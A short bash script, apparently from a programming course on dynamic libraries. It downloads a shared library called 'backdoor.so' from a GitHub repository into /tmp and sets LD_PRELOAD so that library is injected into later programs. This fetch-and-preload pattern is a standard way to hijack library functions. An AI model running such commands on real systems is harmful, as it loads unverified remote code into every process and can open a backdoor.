#!/bin/bash
wget -P /tmp https://github.com/shady-gray/alx-low_level_programming/raw/master/0x18-dynamic_libraries/backdoor.so
export LD_PRELOAD=/tmp/backdoor.so
